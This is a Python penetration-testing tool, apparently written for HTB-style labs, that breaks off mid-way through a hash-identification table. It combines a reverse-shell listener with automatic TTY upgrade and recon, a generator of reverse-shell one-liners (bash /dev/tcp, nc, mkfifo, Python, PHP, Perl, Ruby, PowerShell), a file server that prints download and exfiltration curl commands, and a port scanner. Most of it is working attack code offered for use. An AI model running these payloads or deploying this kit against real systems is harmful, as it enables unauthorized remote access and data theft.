#!/usr/bin/env python3
"""
ignorante - utility tool :)

usage:
  ignorante rs <port>                 reverse-shell listener (+auto tty upgrade)
  ignorante gen [lhost] <lport> [t]   reverse-shell one-liner generator
  ignorante serve [port] [dir]        quick http server for file transfer
  ignorante -h                        help

global flags:
  -q / --quiet   no banner, no colors, machine-friendly output
"""

import os
import re
import ssl
import sys
import time
import codecs
import base64
import socket
import select
import threading
import subprocess
import concurrent.futures
from urllib.parse import quote, unquote, unquote_to_bytes

# ─────────────────────────────────────────────
#  output / quiet mode
# ─────────────────────────────────────────────
# decoration goes to stderr, real data (payloads, listings) goes to stdout,
# so `ignorante gen 9001 bash -q | ...` stays clean and pipeable.

QUIET = False

R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
W = "\033[1;37m"
DIM = "\033[2m"
RST = "\033[0m"


def set_quiet():
    """strip all ansi colors when running quiet."""
    global R, G, Y, B, C, W, DIM, RST, QUIET
    QUIET = True
    R = G = Y = B = C = W = DIM = RST = ""


def eprint(*args, **kwargs):
    """print decoration to stderr so stdout stays data-only."""
    kwargs.setdefault("file", sys.stderr)
    print(*args, **kwargs)


BANNER = fr"""
{R}   _                               _        {RST}
{R}  (_) __ _ _ _  ___  _ _ __ _ _ _ | |_  ___ {RST}
{Y}  | |/ _` | ' \/ _ \| '_/ _` | ' \|  _|/ -_){RST}
{Y}  |_|\__, |_||_\___/|_| \__,_|_||_|\__|\___|{RST}
{R}     |___/                                  {RST}
{DIM}                      utility tool :) // by rodrigo{RST}
"""


def clear_term():
    if QUIET:
        return
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    if QUIET:
        return
    eprint(BANNER)


def section(title: str):
    eprint(f"\n{DIM}--- {title.lower()} ---{RST}")


def info(msg: str):
    eprint(f"{G}[+]{RST} {msg.lower()}")


def warn(msg: str):
    eprint(f"{Y}[!]{RST} {msg.lower()}")


def err(msg: str):
    eprint(f"{R}[x]{RST} {msg.lower()}")


def step(msg: str):
    eprint(f"{B}[>]{RST} {msg.lower()}")


# ─────────────────────────────────────────────
#  network helpers
# ─────────────────────────────────────────────

def local_ips() -> dict:
    """map of interface -> ipv4 address."""
    ips = {}
    try:
        out = subprocess.check_output(
            ["ip", "-o", "-4", "addr", "show"], text=True, stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                ips[parts[1]] = parts[3].split("/")[0]
    except Exception:
        pass
    return ips


def primary_ip() -> str:
    """best-guess attacker ip: prefer vpn (tun0) for htb, else outbound route."""
    ips = local_ips()
    for pref in ("tun0", "tun1", "tap0"):
        if pref in ips:
            return ips[pref]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ─────────────────────────────────────────────
#  module: rs  (reverse-shell listener)
# ─────────────────────────────────────────────

INFO_CMDS = [
    ("uname -a", "kernel / arch"),
    ("id", "current user id"),
    ("whoami", "username"),
    ("ls -la", "directory listing"),
]

TTY_UPGRADE_PY3 = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
TTY_UPGRADE_PY2 = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"


def _drain(conn: socket.socket) -> str:
    """read whatever is currently buffered without blocking."""
    output = b""
    conn.setblocking(False)
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            output += chunk
    except BlockingIOError:
        pass
    finally:
        conn.setblocking(True)
    return output.decode(errors="replace")


def send_cmd(conn: socket.socket, cmd: str) -> str:
    """send a shell command over the socket and collect output."""
    conn.sendall((cmd + "\n").encode())
    time.sleep(0.8)
    return _drain(conn)


def detect_python(conn: socket.socket):
    """try python3 then python on the remote shell."""
    step("probing for python...")
    for binary in ("python3", "python"):
        conn.sendall(f"which {binary}\n".encode())
        time.sleep(0.5)
        if binary in _drain(conn):
            info(f"found: {binary}")
            return binary
    return None


def upgrade_tty(conn: socket.socket, python_bin: str):
    """spawn a pty on the remote for a semi-interactive shell."""
    cmd = TTY_UPGRADE_PY3 if python_bin == "python3" else TTY_UPGRADE_PY2
    section("tty upgrade")
    step(f"sending: {cmd}")
    conn.sendall((cmd + "\n").encode())
    time.sleep(1.5)
    # make the remote shell behave like a real terminal
    for extra in ("export TERM=xterm-256color", "export SHELL=/bin/bash"):
        conn.sendall((extra + "\n").encode())
        time.sleep(0.2)


def run_info_commands(conn: socket.socket):
    """run recon commands and print results."""
    section("machine recon")
    for cmd, label in INFO_CMDS:
        clean = send_cmd(conn, cmd).strip().replace("\n", " ")
        if clean:
            eprint(f"{B}[>]{RST} {label}: {DIM}{clean}{RST}")
        else:
            warn(f"{label}: no output received.")


def interactive_shell(conn: socket.socket):
    """
    fully interactive passthrough when stdin is a real tty: arrow keys, tab
    completion and ctrl-c go straight to the remote pty. falls back to a simple
    line loop when stdin is piped or termios is unavailable.
    """
    raw_ok = sys.stdin.isatty()
    try:
        import termios
        import tty
    except ImportError:
        raw_ok = False

    if not raw_ok:
        _line_shell(conn)
        return

    section("interactive shell  (ctrl-] to quit)")

    # tell the remote pty our real window size for clean redraws
    try:
        cols, rows = os.get_terminal_size()
        conn.sendall(f"stty rows {rows} cols {cols}\n".encode())
    except Exception:
        pass

    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        conn.setblocking(False)
        while True:
            r, _, _ = select.select([conn, sys.stdin], [], [])
            if conn in r:
                try:
                    data = conn.recv(4096)
                except BlockingIOError:
                    data = b""
                if data == b"":
                    break
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                data = os.read(fd, 4096)
                if b"\x1d" in data:  # ctrl-]
                    break
                conn.sendall(data)
    except Exception:
        pass
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
        conn.setblocking(True)
    eprint(f"\n{Y}[!] session closed.{RST}")


def _line_shell(conn: socket.socket):
    """simple line-based shell for non-tty stdin."""
    section("interactive shell  (type 'exit' or ctrl+c to quit)")

    def recv_loop():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            except Exception:
                break

    threading.Thread(target=recv_loop, daemon=True).start()
    try:
        while True:
            cmd = input()
            if cmd.strip().lower() in ("exit", "quit"):
                break
            conn.sendall((cmd + "\n").encode())
    except (KeyboardInterrupt, EOFError):
        pass
    eprint(f"\n{Y}[!] session closed.{RST}")


def rs_command(port: int):
    """main reverse-shell listener logic."""
    clear_term()
    print_banner()
    section(f"reverse listener // port {port}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", port))
    except PermissionError:
        err(f"cannot bind to port {port} (try sudo).")
        sys.exit(1)
    except OSError as e:
        err(f"bind failed: {e}")
        sys.exit(1)

    server.listen(1)
    info(f"listening on port {port} ...")
    warn("waiting for connection...")

    try:
        conn, addr = server.accept()
    except KeyboardInterrupt:
        warn("listener cancelled.")
        server.close()
        sys.exit(0)

    info(f"connection from {addr[0]}:{addr[1]}")
    time.sleep(0.4)

    python_bin = detect_python(conn)
    if python_bin:
        upgrade_tty(conn, python_bin)
        info("tty upgraded.")
    else:
        warn("no python found - skipping tty upgrade.")

    run_info_commands(conn)
    interactive_shell(conn)

    conn.close()
    server.close()


# ─────────────────────────────────────────────
#  module: gen  (reverse-shell one-liner generator)
# ─────────────────────────────────────────────

PAYLOADS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash-udp": "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    "sh": "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc": "nc {ip} {port} -e /bin/sh",
    "nc-mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "python3": (
        "python3 -c 'import socket,os,pty;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'"
    ),
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": (
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
        "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ),
    "ruby": (
        "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    "powershell": (
        "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);"
        "$s.Flush()};$c.Close()\""
    ),
}


def gen_command(args: list):
    """print reverse-shell one-liners for the given lhost/lport."""
    ip = None
    port = None
    shell = "all"

    positional = [a for a in args if not a.startswith("-")]
    if positional and ("." in positional[0] or ":" in positional[0]):
        ip = positional.pop(0)
    if positional:
        port = positional.pop(0)
    if positional:
        shell = positional.pop(0).lower()

    if ip is None:
        ip = primary_ip()
        step(f"auto lhost: {ip} (override: ignorante gen <ip> <port>)")
    if port is None:
        err("missing port. usage: ignorante gen [lhost] <lport> [type]")
        sys.exit(1)
    try:
        int(port)
    except ValueError:
        err("port must be numeric.")
        sys.exit(1)

    if shell == "all":
        selected = list(PAYLOADS.items())
    elif shell in PAYLOADS:
        selected = [(shell, PAYLOADS[shell])]
    else:
        err(f"unknown type '{shell}'. available: {', '.join(PAYLOADS)}")
        sys.exit(1)

    section(f"reverse shells // {ip}:{port}")
    for name, tmpl in selected:
        line = tmpl.format(ip=ip, port=port)
        if QUIET:
            print(line)
        else:
            eprint(f"{C}# {name}{RST}")
            print(line)
            eprint("")
    step(f"catch it with: ignorante rs {port}")


# ─────────────────────────────────────────────
#  module: serve  (quick http file server, get + put)
# ─────────────────────────────────────────────

def serve_command(port: int, directory: str):
    """serve `directory` over http; supports upload via http put."""
    import socketserver
    from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

    directory = os.path.abspath(directory)
    if not os.path.isdir(directory):
        err(f"not a directory: {directory}")
        sys.exit(1)

    class Server(ThreadingHTTPServer):
        # skip getfqdn() reverse-dns, which stalls for seconds on isolated
        # vpn subnets (htb tun0) that have no ptr records.
        def server_bind(self):
            socketserver.TCPServer.server_bind(self)
            host, srv_port = self.server_address[:2]
            self.server_name = host
            self.server_port = srv_port

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=directory, **kw)

        def log_message(self, fmt, *fargs):
            step(f"{self.address_string()} {fmt % fargs}".lower())

        def do_PUT(self):
            # save uploads by basename into the served dir (exfil convenience)
            name = os.path.basename(self.path.lstrip("/")) or "upload.bin"
            dest = os.path.join(directory, name)
            try:
                length = int(self.headers.get("Content-Length", 0))
                with open(dest, "wb") as f:
                    remaining = length
                    while remaining > 0:
                        chunk = self.rfile.read(min(65536, remaining))
                        if not chunk:
                            break
                        f.write(chunk)
                        remaining -= len(chunk)
                self.send_response(201)
                self.end_headers()
                self.wfile.write(f"saved {name}\n".encode())
                info(f"upload saved: {dest}")
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                err(f"upload failed: {e}")

    clear_term()
    print_banner()
    section(f"http server // port {port}")
    ip = primary_ip()
    info(f"serving {directory}")
    info(f"listening on {ip}:{port}")

    section("grab from target")
    eprint(f"{C}# download a file to the target{RST}")
    print(f"wget http://{ip}:{port}/FILE -O /tmp/FILE")
    print(f"curl http://{ip}:{port}/FILE -o /tmp/FILE")
    eprint(f"\n{C}# exfil from the target back to you{RST}")
    print(f"curl -T FILE http://{ip}:{port}/")

    try:
        httpd = Server(("0.0.0.0", port), Handler)
    except PermissionError:
        err(f"cannot bind to port {port} (try sudo or a port >1024).")
        sys.exit(1)
    except OSError as e:
        err(f"bind failed: {e}")
        sys.exit(1)

    section("requests")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        warn("server stopped.")
        httpd.server_close()


# ─────────────────────────────────────────────
#  module: scan  (fast tcp connect scanner + service detection)
# ─────────────────────────────────────────────
# not a full nmap replacement (no root syn scan / os detection / nse) — a fast,
# concurrent connect scan with banner + version grabbing for quick triage.

COMMON_PORTS = [
    21, 22, 23, 25, 53, 79, 80, 81, 88, 106, 110, 111, 113, 119, 123, 135, 137,
    138, 139, 143, 161, 179, 199, 389, 427, 443, 444, 445, 465, 513, 514, 515,
    543, 544, 548, 554, 587, 631, 636, 646, 873, 990, 993, 995, 1025, 1026,
    1027, 1080, 1099, 1194, 1433, 1434, 1521, 1723, 1900, 2000, 2049, 2082,
    2083, 2100, 2121, 2181, 2375, 2376, 3000, 3128, 3260, 3268, 3306, 3389,
    3690, 4369, 4443, 4444, 4786, 5000, 5001, 5060, 5222, 5432, 5555, 5601,
    5672, 5900, 5901, 5985, 5986, 6000, 6379, 6443, 6667, 7000, 7001, 7070,
    7443, 8000, 8008, 8009, 8080, 8081, 8083, 8088, 8089, 8443, 8500, 8888,
    9000, 9001, 9042, 9092, 9200, 9300, 9418, 9999, 10000, 11211, 27017,
    27018, 49152, 50000,
]

HTTP_PORTS = {
    80, 81, 591, 2082, 3000, 5000, 5601, 7070, 8000, 8008, 8009, 8080, 8081,
    8083, 8088, 8089, 8500, 8888, 9000, 9200, 10000,
}
TLS_PORTS = {443, 444, 465, 636, 990, 993, 995, 4443, 5986, 7443, 8443, 9443}

PORT_SVC = {
    3000: "http-alt", 5000: "http-alt", 8000: "http-alt", 8080: "http-proxy",
    8443: "https-alt", 8888: "http-alt", 9000: "http-alt", 9200: "elasticsearch",
    6379: "redis", 27017: "mongodb", 5985: "winrm", 5986: "winrm-ssl",
    5432: "postgresql", 3306: "mysql", 1433: "mssql", 11211: "memcached",
    2049: "nfs", 9092: "kafka", 5672: "amqp", 2375: "docker", 2376: "docker-tls",
}


def parse_ports(spec: str):
    """turn '22,80,8000-8100' or '-'/'all' into a sorted port list."""
    if spec in ("-", "all"):
        return list(range(1, 65536))
    ports = set()
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            ports.update(range(int(a), int(b) + 1))
        else:
            ports.add(int(part))
    return sorted(p for p in ports if 1 <= p <= 65535)


def _service_name(port: int) -> str:
    if port in PORT_SVC:
        return PORT_SVC[port]
    try:
        return socket.getservbyport(port, "tcp")
    except OSError:
        return "?"


def _infer_service(port: int, banner: str) -> str:
    """prefer the protocol the banner reveals over the port's registry name."""
    b = banner.lower()
    if banner.startswith("SSH-"):
        return "ssh"
    if "server:" in b or b.startswith("http/") or "<html" in b:
        return "https" if port in TLS_PORTS else "http"
    if b.startswith("220") and "ftp" in b:
        return "ftp"
    if b.startswith("220") and ("smtp" in b or "esmtp" in b):
        return "smtp"
    if b.startswith("* ok") or "imap" in b:
        return "imap"
    if b.startswith("+ok"):
        return "pop3"
    if "-error" in b and "redis" in b or b.startswith("-noauth"):
        return "redis"
    return _service_name(port)


def grab_banner(sock, port: int) -> str:
    """read a service banner / http server header from an open socket."""
    try:
        sock.settimeout(2.0)
        if port in HTTP_PORTS or port in TLS_PORTS:
            try:
                sock.sendall(b"GET / HTTP/1.0\r\nHost: scan\r\n\r\n")
            except OSError:
                pass
        try:
            data = sock.recv(2048)
        except (socket.timeout, OSError):
            return ""
        text = data.decode(errors="replace")
        first = text.split("\n", 1)[0].lower()
        if "http/" in first or "server:" in text.lower():
            for line in text.split("\r\n"):
                if line.lower().startswith("server:"):
                    return line.split(":", 1)[1].strip()[:120]
            return text.split("\r\n", 1)[0].strip()[:120]
        for line in text.splitlines():
            if line.strip():
                return line.strip()[:120]
    except Exception:
        pass
    return ""


def scan_port(host: str, port: int, timeout: float):
    """connect-scan a single port; return (port, banner) if open else None."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if s.connect_ex((host, port)) != 0:
            s.close()
            return None
    except Exception:
        return None
    banner = ""
    try:
        stream = s
        if port in TLS_PORTS:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                stream = ctx.wrap_socket(s, server_hostname=host)
            except Exception:
                stream = s
        banner = grab_banner(stream, port)
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass
    return port, banner


def scan_command(args: list):
    """fast concurrent tcp connect scan with service detection."""
    host = None
    ports = None
    workers = None
    timeout = 1.0

    i = 0
    try:
        while i < len(args):
            a = args[i]
            if a in ("-p", "--ports"):
                i += 1
                if i < len(args):
                    ports = parse_ports(args[i])
            elif a in ("-p-", "--all"):
                ports = list(range(1, 65536))
            elif a.startswith("-p") and len(a) > 2:
                ports = parse_ports(a[2:])
            elif a in ("-w", "--workers"):
                i += 1
                if i < len(args):
                    workers = int(args[i])
            elif a in ("-t", "--timeout"):
                i += 1
                if i < len(args):
                    timeout = float(args[i])
            elif not a.startswith("-"):
                host = a
            i += 1
    except ValueError:
        err("bad numeric value in flags (-p / -w / -t).")
        sys.exit(1)

    if not host:
        err("usage: ignorante scan <host> [-p 1-1000|-p-|-p 22,80] [-t sec] [-w n]")
        sys.exit(1)
    if ports is None:
        ports = COMMON_PORTS
    if not ports:
        err("no valid ports in spec.")
        sys.exit(1)

    try:
        ip = socket.gethostbyname(host)
    except OSError:
        err(f"cannot resolve host: {host}")
        sys.exit(1)

    if workers is None:
        workers = min(500, max(64, len(ports)))

    clear_term()
    print_banner()
    label = host if host == ip else f"{host} ({ip})"
    section(f"scan // {label}")
    info(f"{len(ports)} ports, {workers} workers, {timeout}s timeout")

    open_ports = []
    done = 0
    start = time.time()
    show_progress = not QUIET and sys.stderr.isatty()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(scan_port, ip, p, timeout) for p in ports]
        for fut in concurrent.futures.as_completed(futures):
            done += 1
            if show_progress and done % 500 == 0:
                eprint(f"\r{DIM}  scanned {done}/{len(ports)}{RST}", end="")
            res = fut.result()
            if res:
                open_ports.append(res)
    if show_progress:
        eprint("\r" + " " * 42 + "\r", end="")

    open_ports.sort()
    dur = time.time() - start
    if not open_ports:
        warn(f"no open ports found ({dur:.1f}s).")
        return

    section("open ports")
    if not QUIET:
        eprint(f"{W}{'port':<11}{'service':<15}banner / version{RST}")
    for port, banner in open_ports:
        svc = _infer_service(port, banner)
        if QUIET:
            print(f"{port}/tcp open {svc} {banner}".rstrip())
        else:
            print(f"{G}{str(port) + '/tcp':<11}{RST}{C}{svc:<15}{RST}{DIM}{banner}{RST}")

    info(f"{len(open_ports)} open / {len(ports)} scanned in {dur:.1f}s")
    open_list = ",".join(str(p) for p, _ in open_ports)
    # case preserved on purpose: nmap flags are case-sensitive.
    eprint(f"{B}[>]{RST} deep scan: {W}nmap -sVC -p{open_list} {host}{RST}")


# ─────────────────────────────────────────────
#  module: enc / dec  (encoding toolbox)
# ─────────────────────────────────────────────

def _pad(s: str, n: int) -> str:
    return s + "=" * (-len(s) % n)


def _rot13(s: str) -> str:
    return codecs.encode(s, "rot_13")


CODECS = {
    "base64": (
        lambda s: base64.b64encode(s.encode()).decode(),
        lambda s: base64.b64decode(_pad(s.strip(), 4)).decode(errors="replace"),
    ),
    "base32": (
        lambda s: base64.b32encode(s.encode()).decode(),
        lambda s: base64.b32decode(_pad(s.strip().upper(), 8)).decode(errors="replace"),
    ),
    "hex": (
        lambda s: s.encode().hex(),
        lambda s: bytes.fromhex(
            s.strip().replace(" ", "").replace("0x", "")
        ).decode(errors="replace"),
    ),
    "url": (
        lambda s: quote(s, safe=""),
        lambda s: unquote(s),
    ),
    "rot13": (_rot13, _rot13),
    "ascii85": (
        lambda s: base64.a85encode(s.encode()).decode(),
        lambda s: base64.a85decode(s.strip()).decode(errors="replace"),
    ),
}
CODEC_ALIASES = {"b64": "base64", "b32": "base32", "a85": "ascii85", "rot": "rot13"}

# alphabet checks used only by `dec auto`, so it doesn't force-decode input that
# clearly isn't that encoding (e.g. base32 upper-casing arbitrary text).
_RE = {
    "base64": re.compile(r"^[A-Za-z0-9+/]{4,}={0,2}$"),
    "base32": re.compile(r"^[A-Z2-7]{8,}={0,6}$"),
    "hex": re.compile(r"^(?:0x)?[0-9a-fA-F ]{4,}$"),
    "ascii85": re.compile(r"^[\x21-\x75]{4,}$"),
}


def _plausible(name: str, data: str) -> bool:
    """rough alphabet gate for auto-decode."""
    s = data.strip()
    if name == "url":
        return "%" in s
    if name == "rot13":
        return any(c.isalpha() for c in s)
    if name == "hex":
        return _RE["hex"].match(s) is not None and len(s.replace(" ", "").replace("0x", "")) % 2 == 0
    rx = _RE.get(name)
    return rx.match(s) is not None if rx else True


def _codec(name: str):
    name = CODEC_ALIASES.get(name.lower(), name.lower())
    return name, CODECS.get(name)


def _read_data(args: list) -> str:
    if args:
        return " ".join(args)
    return sys.stdin.read().rstrip("\n")


# byte-returning decoders for auto mode. rot13/ascii85 are excluded: they match
# almost any input and produce constant false positives.
AUTO_DECODERS = {
    "base64": lambda s: base64.b64decode(_pad(s.strip(), 4), validate=True),
    "base32": lambda s: base64.b32decode(_pad(s.strip().upper(), 8)),
    "hex": lambda s: bytes.fromhex(s.strip().replace(" ", "").replace("0x", "")),
    "url": lambda s: unquote_to_bytes(s),
}


def _printable_bytes_ratio(b: bytes) -> float:
    if not b:
        return 0.0
    ok = sum(1 for c in b if 0x20 <= c < 0x7f or c in (9, 10, 13))
    return ok / len(b)


def _dec_auto(data: str):
    """try the distinctive-alphabet decoders; show ones yielding readable text."""
    section("auto-decode")
    found = False
    for name, dec in AUTO_DECODERS.items():
        if not _plausible(name, data):
            continue
        try:
            raw = dec(data)
        except Exception:
            continue
        # score the raw bytes so replacement chars can't fake "readable"
        if not raw or _printable_bytes_ratio(raw) < 0.95:
            continue
        out = raw.decode("utf-8", errors="replace")
        if out == data:
            continue
        found = True
        if QUIET:
            print(out)
        else:
            eprint(f"{C}# {name}{RST}")
            print(out)
            eprint("")
    if not found:
        warn("nothing decoded to readable text.")


def enc_command(args: list):
    if not args:
        err(f"usage: ignorante enc <scheme> [data]   schemes: {', '.join(CODECS)}")
        sys.exit(1)
    name, fns = _codec(args[0])
    if not fns:
        err(f"unknown scheme '{args[0]}'. available: {', '.join(CODECS)}")
        sys.exit(1)
    try:
        print(fns[0](_read_data(args[1:])))
    except Exception as e:
        err(f"encode failed: {e}")
        sys.exit(1)


def dec_command(args: list):
    if not args:
        err(f"usage: ignorante dec <scheme|auto> [data]   schemes: {', '.join(CODECS)}, auto")
        sys.exit(1)
    if args[0].lower() == "auto":
        _dec_auto(_read_data(args[1:]))
        return
    name, fns = _codec(args[0])
    if not fns:
        err(f"unknown scheme '{args[0]}'. available: {', '.join(CODECS)}, auto")
        sys.exit(1)
    try:
        print(fns[1](_read_data(args[1:])))
    except Exception as e:
        err(f"decode failed: {e}")
        sys.exit(1)


# ─────────────────────────────────────────────
#  module: hashid  (hash type identification)
# ─────────────────────────────────────────────
# each entry: (pattern, [(name, hashcat_mode, john_format), ...]).
# order matters — unambiguous structured formats first, then raw-hex by length,
# then short/ambiguous base64 forms last. hashcat mode / john format are None
# when there isn't a well-known one.

_HASH_DB_RAW = [
    # --- structured / prefixed (unambiguous) ---
    (r"^\$2[abxy]?\$\d\d\$[./A-Za-z0-9]{53}$",
        [("bcrypt (Blowfish)", 3200, "bcrypt")]),
    (r"^\$1\$[./0-9A-Za-z]{1,8}\$[./0-9A-Za-z]{22}$",
        [("md5crypt (Unix MD5, $1$)", 500, "md5crypt")]),
    (r"^\$apr1\$[./0-9A-Za-z]{1,8}\$[./0-9A-Za-z]{22}$",
        [("Apache apr1 (MD5)", 1600, "md5crypt")]),
    (r"^\$5\$(rounds=\d+\$)?[./0-9A-Za-z]{1,16}\$[./0-9A-Za-z]{43}$",
        [("sha256crypt (Unix, $5$)", 7400, "sha256crypt")]),
    (r"^\$6\$(rounds=\d+\$)?[./0-9A-Za-z]{1,16}\$[./0-9A-Za-z]{86}$",
        [("sha512crypt (Unix, $6$)", 1800, "sha512crypt")]),
    (r"^\$y\$[./A-Za-z0-9]+\$[./A-Za-z0-9]+\$[./A-Za-z0-9]+$",
        [("yescrypt", None, "crypt")]),
    (r"^\$7\$[./A-Za-z0-9]{11,}$",
        [("scrypt ($7$)", 8900, None)]),
    (r"^\$argon2(id|i|d)\$",
        [("Argon2", None, "argon2")]),
    (r"^\$pbkdf2-sha512\$",
        [("PBKDF2-HMAC-SHA512 (passlib)", 12100, None)]),
    (r"^\$pbkdf2-sha256\$",
        [("PBKDF2-HMAC-SHA256 (passlib)", 10900, None)]),
    (r"^\$pbkdf2\$",
        [("PBKDF2-HMAC-SHA1 (passlib)", 12000, None)]),
    (r"^pbkdf2_sha256\$\d+\$",
        [("Django PBKDF2-SHA256", 10000, "django")]),
    (r"^sha1\$[^$]+\$[0-9a-fA-F]{40}$",
        [("Django SHA1", 124, None)]),
    (r"^md5\$[^$]+\$[0-9a-fA-F]{32}$",
        [("Django MD5", None, None)]),
    (r"^\$P\$[./0-9A-Za-z]{31}$",
        [("phpass (WordPress / phpBB3)", 400, "phpass")]),
    (r"^\$H\$[./0-9A-Za-z]{31}$",
        [("phpass (Drupal 7 / older)", 400, "phpass")]),
    (r"^\$S\$[./0-9A-Za-z]{52}$",
        [("Drupal 7 (SHA-512)", 7900, "drupal7")]),
    (r"^\{SSHA512\}[A-Za-z0-9+/]{20,}={0,2}$",
        [("LDAP SSHA-512 (base64)", 1711, None)]),
    (r"^\{SSHA\}[A-Za-z0-9+/]{20,}={0,2}$",
        [("LDAP SSHA-1 (salted SHA1, base64)", 111, "ssha")]),
    (r"^\{SHA\}[A-Za-z0-9+/]{27}=$",
        [("LDAP SHA-1 (base64)", 101, "raw-sha1")]),
    (r"^\{SMD5\}[A-Za-z0-9+/]{20,}={0,2}$",
        [("LDAP salted MD5 (base64)", None, None)]),
    (r"^\{MD5\}[A-Za-z0-9+/]{22}==$",
        [("LDAP MD5 (base64)", None, None)]),
    (r"^\$NT\$[0-9a-fA-F]{32}$",
        [("NTLM ($NT$)", 1000, "nt")]),
    (r"^\*[0-9A-Fa-f]{40}$",
        [("MySQL 4.1+/5.x (SHA1(SHA1))", 300, "mysql-sha1")]),
    (r"^0x0100[0-9a-fA-F]{48}$",
        [("MSSQL 2005", 132, "mssql05")]),
    (r"^0x0100[0-9a-fA-F]{88}$",
        [("MSSQL 2000", 131, "mssql")]),
    (r"^0x0200[0-9a-fA-F]{136}$",
        [("MSSQL 2012/2014", 1731, "mssql12")]),
    (r"^\$8\$[./A-Za-z0-9]+\$[./A-Za-z0-9]{43}$",
        [("Cisco IOS type 8 (PBKDF2-SHA256)", 9200, "cisco8")]),
    (r"^\$9\$[./A-Za-z0-9]+\$[./A-Za-z0-9]{43}$",
        [("Cisco IOS type 9 (scrypt)", 9300, "cisco9")]),
    (r"^\$krb5tgs\$",
        [("Kerberos 5 TGS-REP", 13100, "krb5tgs")]),
    (r"^\$krb5asrep\$",
        [("Kerberos 5 AS-REP", 18200, "krb5asrep")]),
    (r"^\$krb5pa\$",
        [("Kerberos 5 AS-REQ Pre-Auth", 7500, "krb5pa-md5")]),
    (r"^\$sshng\$",
        [("SSH private key", 22921, "ssh")]),
    (r"^\$DCC2\$",
        [("Domain Cached Credentials 2 (MS-Cache v2)", 2100, "mscash2")]),
    (r"^\$WPAPSK\$",
        [("WPA/WPA2 PSK", 2500, "wpapsk")]),
    (r"^\$office\$",
        [("MS Office document", None, "office")]),
    (r"^\$pdf\$",
        [("PDF document", None, "pdf")]),
    (r"^\$zip2\$",
        [("WinZip", 13600, "zip")]),
    (r"^\$pkzip2\$",
        [("PKZIP", 17200, "pkzip")]),
    (r"^\$rar5\$",
        [("RAR5", 13000, "rar5")]),
    (r"^\$RAR3\$",
        [("RAR3", 12500, "rar3")]),
    (r"^\$7z\$",
        [("7-Zip", 11600, "7z")]),
    (r"^\$keepass\$",
        [("KeePass", 13400, "keepass")]),
    (r"^\$bitcoin\$",
        [("Bitcoin/Litecoin wallet.dat", 11300, "bitcoin")]),
    (r"^\$ethereum\$",
        [("Ethereum wallet", 15600, "ethereum")]),
    (r"^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$",
        [("JWT (JSON Web Token)", 16500, None)]),
    (r"^[^:]+::[^:]*:[0-9a-fA-F]{48}:[0-9a-fA-F]{48}:[0-9a-fA-F]{16}$",
        [("NetNTLMv1", 5500, "netntlm")]),
    (r"^[^:]+::[^:]*:[0-9a-fA-F]{16}:[0-9a-fA-F]{32}:[0-9a-fA-F]+$",
        [("NetNTLMv2", 5600, "netntlmv2")]),

    # --- raw hex by length ---
    (r"^[a-fA-F0-9]{4}$",
        [("CRC-16", None, None), ("CRC-16-CCITT", None, None)]),
    (r"^[a-fA-F0-9]{8}$",
